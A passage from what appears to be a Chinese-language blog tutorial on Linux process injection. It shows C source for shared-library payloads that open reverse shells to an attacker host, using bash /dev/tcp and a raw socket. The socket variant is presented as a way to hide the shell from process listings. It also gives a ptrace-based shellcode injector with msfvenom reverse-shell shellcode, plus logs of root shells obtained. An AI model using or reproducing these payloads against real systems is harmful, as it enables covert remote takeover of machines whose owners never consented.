<p>使用别已经造好的进程注入轮子：<a href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p>
<h3 id="1-2-进程注入工具安装"><a href="#1-2-进程注入工具安装" class="headerlink" title="1.2 进程注入工具安装"></a>1.2 进程注入工具安装</h3><p><strong>1. 下载：</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/gaffe23/</span>linux-inject.git</span><br></pre></td></tr></table></figure>

<p><strong>2. 编译：</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cd</span> linux-inject</span><br><span class="line"><span class="attribute">make</span> x<span class="number">86</span>_<span class="number">64</span></span><br></pre></td></tr></table></figure>

<p>如果报错类似如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/include/stdio.h:27:10: fatal error: <span class="string">&#x27;bits/libc-header-start.h&#x27;</span> file not found</span><br></pre></td></tr></table></figure>

<p>执行<code>apt install gcc-multilib</code>即可。</p>
<p><strong>3. 测试是否编译成功：</strong></p>
<ul>
<li><p>启动sample-target</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  linux-inject git:(master) ./sample-target</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br></pre></td></tr></table></figure></li>
<li><p>查看sample-target的进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  linux-inject git:(master) ps -ef | grep sample-target | grep -v grep</span><br><span class="line">root      15771  15710  0 20:12 pts/3    00:00:00 ./sample-targe</span><br></pre></td></tr></table></figure>

<p>进程为15771</p>
</li>
<li><p>尝试注入进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  linux-inject git:(master) ./inject -p 15771 ./sample-library.so</span><br><span class="line">targeting process with pid 15771</span><br><span class="line">could not inject <span class="string">&quot;./sample-library.so&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p>进程注入成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  linux-inject git:(master) ./sample-target</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">......</span><br><span class="line">I just got loaded</span><br></pre></td></tr></table></figure>

<p>注入成功会有”I just got loaded“的提示</p>
</li>
</ul>
<h3 id="1-3-编写一个简单的poc"><a href="#1-3-编写一个简单的poc" class="headerlink" title="1.3 编写一个简单的poc"></a>1.3 编写一个简单的poc</h3><p>我们重写so文件，进行反弹shell。</p>
<p>poc1.c:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;I just got loaded\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1\&quot;&quot;</span>);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们用clang进行编译，编译前先安装<code>apt install clang</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o poc1.so -lpthread -fPIC poc1.c</span><br></pre></td></tr></table></figure>

<p>我们启动一个python进程用来注入</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p>在攻击机上启动监听：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>注入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ ps -ef | grep 9999 | grep -v grep</span><br><span class="line">root      16603  15710  0 20:38 pts/3    00:00:00 python3 -m http.server 9999</span><br><span class="line">➜ ./linux-inject/inject -p 16603 ./poc1.so</span><br><span class="line">targeting process with pid 16603</span><br><span class="line">ptrace(PTRACE_GETSIGINFO) failed</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:37444.</span><br><span class="line">root@vuln:~/poc/linux-inject<span class="comment">#</span></span><br></pre></td></tr></table></figure>



<h3 id="1-4-测试开启ptrace-scope"><a href="#1-4-测试开启ptrace-scope" class="headerlink" title="1.4 测试开启ptrace_scope"></a>1.4 测试开启ptrace_scope</h3><p>我用的debian,linux内核 4.19，测试是成功的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">echo</span> 1 | tee /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">➜ cat /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">➜ ps -ef | grep 6666 | grep -v grep</span><br><span class="line">root        854    649  1 10:32 pts/1    00:00:00 python3 -m http.server 6666</span><br><span class="line"></span><br><span class="line">➜ ./linux-inject/inject -p 854 ./poc1.so</span><br><span class="line">targeting process with pid 854</span><br><span class="line">ptrace(PTRACE_GETSIGINFO) failed</span><br><span class="line"></span><br><span class="line">➜ uname -a</span><br><span class="line">Linux vuln 4.19.0-18-amd64 <span class="comment">#1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>



<h3 id="1-5-使用多线程编写poc"><a href="#1-5-使用多线程编写poc" class="headerlink" title="1.5 使用多线程编写poc"></a>1.5 使用多线程编写poc</h3><p>修改poc为多线程版本，将后门代码与正常逻辑分离执行，这样就不会影响正常的线程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;I just got loaded\n&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1\&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">pthread_t</span> thread_id;</span><br><span class="line">   pthread_create(&amp;thread_id,<span class="literal">NULL</span>,shell,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o poc2.so -lpthread -fPIC poc2.c</span><br><span class="line">poc2.c:17:4: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;pthread_create&#x27;</span> is invalid <span class="keyword">in</span> C99 [-Wimplicit-function-declaration]</span><br></pre></td></tr></table></figure>

<p><strong>启动一个被注入的python进程：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 1111</span><br></pre></td></tr></table></figure>

<p><strong>攻击机监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>



<p><strong>进程注入：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ ps -ef | grep 1111 | grep -v grep</span><br><span class="line">root       1333   1299  0 11:53 pts/1    00:00:00 python3 -m http.server 1111</span><br><span class="line">➜ ./linux-inject/inject -p 1333 ./poc2.so</span><br><span class="line">targeting process with pid 1333</span><br><span class="line">could not inject <span class="string">&quot;./poc2.so</span></span><br></pre></td></tr></table></figure>

<p><strong>收到了shell：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:39404.</span><br><span class="line">root@vuln:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>



<h3 id="1-6-使用socket套接字编写poc"><a href="#1-6-使用socket套接字编写poc" class="headerlink" title="1.6 使用socket套接字编写poc"></a>1.6 使用socket套接字编写poc</h3><p>这种方式的好处是可以隐藏我们的行为，上述方式都可以通过查看进程的方式发现恶意注入的代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ ps -ef | grep bash</span><br><span class="line">root       1447   1406  0 12:00 pts/1    00:00:00 sh -c bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1&quot;</span></span><br><span class="line">root       1448   1447  0 12:00 pts/1    00:00:00 bash -c bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1</span><br><span class="line">root       1449   1448  0 12:00 pts/1    00:00:00 bash -i</span><br><span class="line">root       1487    978  0 12:00 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox bash</span><br></pre></td></tr></table></figure>

<p>我们可以发现我们已经暴露了我们反弹的shell地址。</p>
<p>解决方式就是自己写一个socket连接，而不是调用system函数</p>
<p>poc.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line">    <span class="keyword">int</span> sock;</span><br><span class="line">    <span class="keyword">char</span> shell[]=<span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>((sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server.sin_family = AF_INET;</span><br><span class="line">    server.sin_port = htons(<span class="number">4444</span>);</span><br><span class="line">    server.sin_addr.s_addr = inet_addr(<span class="string">&quot;172.16.42.100&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;server, <span class="keyword">sizeof</span>(struct sockaddr)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dup2(sock, <span class="number">0</span>);</span><br><span class="line">    dup2(sock, <span class="number">1</span>);</span><br><span class="line">    dup2(sock, <span class="number">2</span>);</span><br><span class="line">    execl(shell,<span class="string">&quot;/bin/bash&quot;</span>,(<span class="keyword">char</span> *)<span class="number">0</span>);</span><br><span class="line">    close(sock);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I just got loaded\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thread_id;</span><br><span class="line">    pthread_create(&amp;thread_id,<span class="literal">NULL</span>,hello,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o poc.so -lpthread -fPIC poc.c</span><br></pre></td></tr></table></figure>

<p><strong>启一个python进程作为注入目标：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 123</span><br></pre></td></tr></table></figure>

<p><strong>攻击机启动监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><strong>注入进程：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ps -ef | grep 123 | grep -v grep</span><br><span class="line">root       1694   1299  0 12:08 pts/1    00:00:00 python3 -m http.server 123</span><br><span class="line">➜  ./linux-inject/inject -p 1694 ./poc.so</span><br><span class="line">targeting process with pid 1694</span><br><span class="line">ptrace(PTRACE_GETSIGINFO) failed</span><br></pre></td></tr></table></figure>

<p><strong>结果：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vuln:~<span class="comment"># exit</span></span><br><span class="line">NCAT DEBUG: Closing fd 5.</span><br><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:39410.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br></pre></td></tr></table></figure>

<p><strong>再次查看进程：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ps -ef | grep bash</span><br><span class="line">root       1694   1299  0 12:08 pts/1    00:00:00 /bin/bash</span><br><span class="line">root       1785    978  0 12:10 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox bash</span><br><span class="line">➜  ps -ef | grep python</span><br><span class="line">root        435      1  0 11:27 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal</span><br><span class="line">root       1547   1299  0 12:04 pts/1    00:00:00 python3 -m http.server 3333</span><br><span class="line">root       1800    978  0 12:10 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox python</span><br></pre></td></tr></table></figure>

<p><strong>通过网络连接查看：</strong></p>
<p>通过网络连接可以发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  netstat -pantu</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">......</span><br><span class="line">tcp        0      0 172.16.42.151:39410     172.16.42.100:4444      ESTABLISHED 1694/bas</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<h2 id="2-通过shellcode注入进程"><a href="#2-通过shellcode注入进程" class="headerlink" title="2. 通过shellcode注入进程"></a>2. 通过shellcode注入进程</h2><p>攻击机器：172.16.42.100</p>
<p>靶机：172.16.42.151</p>
<p>获取poc：<a href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a></p>
<p>生成shellcode(如果不生成，会在靶机上生成一个终端):</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp <span class="attribute">LHOST</span>=172.16.42.100 <span class="attribute">LPORT</span>=4444 -f c</span><br></pre></td></tr></table></figure>

<p>替换shellcode(==注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值==）:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Mem Inject</span></span><br><span class="line"><span class="comment">  Copyright (c) 2016 picoFlamingo</span></span><br><span class="line"><span class="comment">This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment">(at your option) any later version.</span></span><br><span class="line"><span class="comment">This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELLCODE_SIZE 74</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *shellcode = </span><br><span class="line"><span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">inject_data</span> <span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">unsigned</span> <span class="keyword">char</span> *src, <span class="keyword">void</span> *dst, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span>      i;</span><br><span class="line">  <span class="keyword">uint32_t</span> *s = (<span class="keyword">uint32_t</span> *) src;</span><br><span class="line">  <span class="keyword">uint32_t</span> *d = (<span class="keyword">uint32_t</span> *) dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i+=<span class="number">4</span>, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(POKETEXT):&quot;</span>);</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span>                   target;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="keyword">int</span>                     syscall;</span><br><span class="line">  <span class="keyword">long</span>                    dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage:\n\t%s pid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Tracing process %d\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_ATTACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(ATTACH):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Waiting for process...\n&quot;</span>);</span><br><span class="line">  wait (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Getting Registers\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_GETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inject code into current RPI position */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Injecting shell code at %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line">  inject_data (target, shellcode, (<span class="keyword">void</span>*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line"></span><br><span class="line">  regs.rip += <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Setting instruction pointer to %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_SETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Run it!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_DETACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(DETACH):&quot;</span>);</span><br><span class="line">	  <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译代码:</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">gcc infect.<span class="keyword">c</span> -o infectx</span><br></pre></td></tr></table></figure>

<p>攻击机监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>靶机宿主机启动一个python server进程</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">124</span></span><br></pre></td></tr></table></figure>

<p>注入</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ps -ef | grep 124 | grep -v grep</span><br><span class="line">root       2239   2216  0 09:43 pts/1    00:00:00 python3 -m http.server 124</span><br><span class="line">➜  ./infectx 2239</span><br><span class="line">+ Tracing process 2239</span><br><span class="line">+ Waiting <span class="keyword">for</span> process...</span><br><span class="line">+ Getting Registers</span><br><span class="line">+ Injecting shell code at 0x7f222adc87e4</span><br><span class="line">+ Setting instruction pointer to 0x7f222adc87e6</span><br><span class="line">+ Run it!</span><br></pre></td></tr></table></figure>

<p> 结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:39412.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>





